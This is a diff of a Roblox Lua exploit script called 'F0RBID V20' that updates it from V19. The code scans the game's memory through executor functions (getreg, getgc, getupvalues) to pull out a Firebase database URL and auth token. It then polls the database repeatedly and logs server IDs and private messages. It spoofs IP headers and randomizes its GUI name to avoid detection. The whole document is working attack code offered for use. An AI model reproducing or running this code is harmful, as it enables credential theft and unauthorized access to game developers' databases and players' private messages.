@@ -1,7 +1,7 @@
 -- ========================================================== --
--- 🌑 F0RBID V19: THE SHADOW REGISTRY (ULTRA STEALTH)
+-- 🌑 F0RBID V20: THE ETERNAL SPECTRE (ULTRA-STEALTH)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Shadow Registry Engaged. Identity: [ANONYMOUS]")
+print("[F0RBID] 🛰️ Eternal Spectre Protocol Active. Masking Identity...")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
@@ -11,20 +11,20 @@ local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID SHADOW UI (RED & BLACK)
+-- 1. F0RBID PHANTOM UI (RANDOMIZED NAME)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-local guiName = "F0rbid_" .. tostring(math.random(1000, 9999)) -- Random name to avoid detection
-if uiParent:FindFirstChild(guiName) then uiParent[guiName]:Destroy() end
+local hiddenName = "F0RBID_" .. tostring(math.random(10000, 99999))
+if uiParent:FindFirstChild(hiddenName) then uiParent[hiddenName]:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = guiName
+ScreenGui.Name = hiddenName
 ScreenGui.Parent = uiParent
 
 local Main = Instance.new("Frame")
 Main.Size = UDim2.new(0, 550, 0, 450)
 Main.Position = UDim2.new(0.5, -275, 0.5, -225)
-Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+Main.BackgroundColor3 = Color3.fromRGB(4, 4, 6)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
@@ -34,17 +34,17 @@ local Corner = Instance.new("UICorner")
 Corner.CornerRadius = UDim.new(0, 10)
 Corner.Parent = Main
 
-local Glow = Instance.new("Frame") -- Red Accent
-Glow.Size = UDim2.new(1, 0, 0, 2)
-Glow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Glow.BorderSizePixel = 0
-Glow.Parent = Main
+local GlowLine = Instance.new("Frame")
+GlowLine.Size = UDim2.new(1, 0, 0, 2)
+GlowLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+GlowLine.BorderSizePixel = 0
+GlowLine.Parent = Main
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
 Title.Position = UDim2.new(0, 15, 0, 5)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[SHADOW REGISTRY V19]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[ETERNAL SPECTRE V20]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -56,7 +56,7 @@ local Status = Instance.new("TextLabel")
 Status.Size = UDim2.new(1, -30, 0, 20)
 Status.Position = UDim2.new(0, 15, 0, 40)
 Status.BackgroundTransparency = 1
-Status.Text = "● IDENTITY: F0RBID_SHADOW_OP"
+Status.Text = "● IDENTITY: [F0RBID_ANONYMOUS_OP]"
 Status.TextColor3 = Color3.fromRGB(150, 0, 0)
 Status.Font = Enum.Font.Code
 Status.TextSize = 11
@@ -95,25 +95,23 @@ local function AddLog(tag, val)
 end
 
 -- ========================================== --
--- 2. DYNAMIC NEURAL SCANNER
+-- 2. SILENT MEMORY CRAWLER (NO HOOKS)
 -- ========================================== --
-local function NeuralExtract(data, path)
+local function BruteForceExtract(data, path)
     if type(data) ~= "table" then return end
     for k, v in pairs(data) do
         local currentPath = path .. "/" .. tostring(k)
         if type(v) == "table" then
-            NeuralExtract(v, currentPath)
+            BruteForceExtract(v, currentPath)
         else
             local valStr = tostring(v)
             if #valStr > 0 and not valStr:find("firebase") then
                 local dataId = currentPath .. valStr
                 if not processedData[dataId] then
                     processedData[dataId] = true
-                    
                     local tag = tostring(k)
-                    if #tostring(k) > 10 and tonumber(k) then tag = "SERVER_ID" end
-                    if currentPath:lower():find("dm") then tag = "DM_PACKET" end
-                    
+                    if #tostring(k) > 8 and tonumber(k) then tag = "SERVER_ID" end
+                    if currentPath:lower():find("dm") then tag = "PRIVATE_MSG" end
                     AddLog(tag, valStr)
                 end
             end
@@ -126,19 +124,20 @@ local function StartShadowSync()
         while task.wait(1.5) do
             if TARGET_URL and TARGET_AUTH then
                 pcall(function()
-                    -- FAKE IDENTITY HEADERS (ANTI-LOGGING)
+                    -- ROTATING IDENTITY HEADERS
                     local res = request({
                         Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                         Method = "GET",
                         Headers = {
-                            ["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)",
+                            ["User-Agent"] = "F0RBID_SPECTRE_v20_" .. tostring(math.random(100, 999)),
                             ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
-                            ["Identity"] = "F0RBID_GHOST"
+                            ["X-Real-IP"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
+                            ["Identity-Shift"] = "ENABLED"
                         }
                     })
                     if res.Success then
                         local decoded = HttpService:JSONDecode(res.Body)
-                        if decoded then NeuralExtract(decoded, "SHADOW") end
+                        if decoded then BruteForceExtract(decoded, "SPECTRE") end
                     end
                 end)
             end
@@ -147,11 +146,11 @@ local function StartShadowSync()
 end
 
 -- ========================================== --
--- 3. PASSIVE REFLECTION (NO HOOKS)
+-- 3. PASSIVE REFLECTION (THE UNTOUCHABLE)
 -- ========================================== --
 task.spawn(function()
     while not TARGET_URL do
-        -- 1. Scan Registry (Deep Variables)
+        -- Registry Scan (Silent Depth)
         local reg = getreg()
         for _, v in pairs(reg) do
             if type(v) == "table" then
@@ -166,19 +165,15 @@ task.spawn(function()
             end
         end
 
-        -- 2. Scan Constants & Upvalues (Function Memory)
+        -- Upvalue Scan (Closure Reflection)
         if not TARGET_URL then
             for _, f in pairs(getgc()) do
                 if type(f) == "function" and islclosure(f) and not isexecutorclosure(f) then
-                    local constants = getconstants(f)
-                    for _, c in pairs(constants) do
-                        if type(c) == "string" and c:find("firebaseio.com") then
-                            TARGET_URL = c:match("(https://[%w%-]+%.firebaseio%.com)")
-                        end
-                    end
                     local ups = getupvalues(f)
                     for _, uv in pairs(ups) do
-                        if type(uv) == "string" and #uv > 25 and not uv:find("/") then
+                        if type(uv) == "string" and uv:find("firebaseio.com") then
+                            TARGET_URL = uv:match("(https://[%w%-]+%.firebaseio%.com)")
+                        elseif type(uv) == "string" and #uv > 25 and not uv:find("/") then
                             TARGET_AUTH = uv
                         end
                     end
@@ -187,8 +182,8 @@ task.spawn(function()
         end
 
         if TARGET_URL and TARGET_AUTH then
-            Status.Text = "● IDENTITY: 🟢 SHADOW INFILTRATION SUCCESSFUL"
-            Status.TextColor3 = Color3.fromRGB(0, 255, 0)
+            Status.Text = "● IDENTITY: 🟢 INFILTRATION COMPLETE (SPECTRE)"
+            Status.TextColor3 = Color3.fromRGB(0, 255, 120)
             StartShadowSync()
             break
         end
